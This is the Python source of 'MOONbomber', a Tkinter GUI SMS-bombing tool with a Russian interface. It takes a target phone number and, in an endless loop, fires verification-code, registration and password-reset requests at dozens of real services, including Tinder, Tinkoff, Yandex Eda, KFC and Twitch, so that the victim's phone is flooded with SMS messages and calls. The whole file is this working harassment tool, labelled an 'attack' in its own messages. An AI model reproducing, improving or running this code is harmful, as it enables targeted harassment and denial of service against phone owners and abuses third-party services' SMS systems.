import requests
import random
import threading 
from tkinter import Entry
from tkinter import Text
from tkinter import Button
from tkinter import Label
import tkinter as tk
from tkinter import messagebox as mb


root = tk.Tk()



def getvalue():
	global _phone 
	_phone = mystring.get()
	lenp = len(_phone)
	if lenp<9:
		mb.showerror('Ошибка','Номер слишком короткий или вы не ввели его!.')
		logs.insert('insert', '\n Получена ошибка!')
		clear()
	else:
		startatm()


def stopat():
	raise SystemExit
	 

def startatm():
	t.start()

def clear():
	
	for i in range(20):
		i=i+1
		e1.delete(0,)



def startat():

	mb.showinfo(title="MOON", message="Атака началась !")
	clear()
	global x
	_name = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

	iteration = 0
	while True:
		_email = _name+f'{iteration}'+'@gmail.com'
		email = _name+f'{iteration}'+'@gmail.com'
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			logs.insert('insert','\n [+] Grab отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			logs.insert('insert','\n [+] RuTaxi отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			logs.insert('insert','\n [+] BelkaCar отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			logs.insert('insert','\n [+] Tinder отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			logs.insert('insert','\n [+] Karusel отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			logs.insert('insert','\n [+] Tinkoff отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			logs.insert('insert','\n [+] MTS отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			logs.insert('insert','\n [+] Youla отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			logs.insert('insert','\n [+] PizzaHut отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			logs.insert('insert','\n [+] Rabota отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
			logs.insert('insert','\n [+] Rutube отправлено!')
		except:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
			logs.insert('insert','\n [+] Citilink отправлено!')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			logs.insert('insert','\n [+] Smsint отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			logs.insert('insert','\n [+] oyorooms отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
			logs.insert('insert','\n [+] MVideo отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			logs.insert('insert','\n [+] newnext отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			logs.insert('insert','\n [+] Sunlight отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			logs.insert('insert','\n [+] alpari отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			logs.insert('insert','\n [+] Invitro отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
			logs.insert('insert','\n [+] Sberbank отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			logs.insert('insert','\n [+] Psbank отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			logs.insert('insert','\n [+] Beltelcom отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
			logs.insert('insert','\n [+] Karusel отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
			logs.insert('insert','\n [+] KFC отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			logs.insert('insert','\n [+] carsmile отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			logs.insert('insert','\n [+] Citilink отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			logs.insert('insert','\n [+] Delitime отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			logs.insert('insert','\n [+] findclone звонок отправлен!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			logs.insert('insert','\n [+] Guru отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			logs.insert('insert','\n [+] ICQ отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			logs.insert('insert','\n [+] InDriver отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
			logs.insert('insert','\n [+] Invitro отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
			logs.insert('insert','\n [+] Pmsm отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			logs.insert('insert','\n [+] IVI отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
			logs.insert('insert','\n [+] Lenta отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
			logs.insert('insert','\n [+] Mail.ru отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			logs.insert('insert','\n [+] MVideo отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			logs.insert('insert','\n [+] OK отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://plink.tech/register/',json={"phone": _phone})
			logs.insert('insert','\n [+] Plink отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
			logs.insert('insert','\n [+] qlean отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
			logs.insert('insert','\n [+] SMSgorod отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
			logs.insert('insert','\n [+] Tinder отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
			logs.insert('insert','\n [+] Twitch отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
			logs.insert('insert','\n [+] CabWiFi отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
			logs.insert('insert','\n [+] wowworks отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			logs.insert('insert','\n [+] Eda.Yandex отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			logs.insert('insert','\n [+] Youla отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
			logs.insert('insert','\n [+] Alpari отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
			logs.insert('insert','\n [+] SMS отправлено!')
		except:
			logs.insert('insert','\n [-] не отправлено!')

		try:
			requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
			logs.insert('insert','\n [+] Delivery отправлено!')
		except:
			logs.insert('insert','\n [-] Не отправлено!')
	
t = threading.Thread(target = startat, name = 'Thread')
		
					
	

root.resizable(width = False, height = False)
root.iconbitmap("Lune_ico.ico")
root.geometry("400x480")
root.title("MOONbomber")
root['bg'] = "#141414"


mystring = tk.StringVar(root)













text1 = Label(text = 'Number phone', 
	font = 50,
	bg = '#1c0f1a',
	fg = '#f216ce')

e1 = Entry(root,textvariable = mystring,
	width=100,
	fg='#f216ce',
	bd=5,
	bg='#383738',
	font = 15,
	justify = 'center')



button1 = tk.Button(root, 
				text='START',
				font=10,
				fg='#fc12d5', 
				bg='#4a0b44',
				height = 2,
				width = 10,
				command=getvalue,)



logs = Text(fg = '#fc12d5',
	bg = "#141414",
	height = 12,
	width = 50,
	wrap = 'word',
	font = 15 )


stop = Button(text='STOP',
				font=10,
				fg='#fa2ae5', 
				bg='#5c0c54',
				height = 2,
				width = 10,
				command=stopat,)
			





text1.pack()
e1.pack()
button1.pack()
stop.pack()
logs.pack()








root.mainloop()


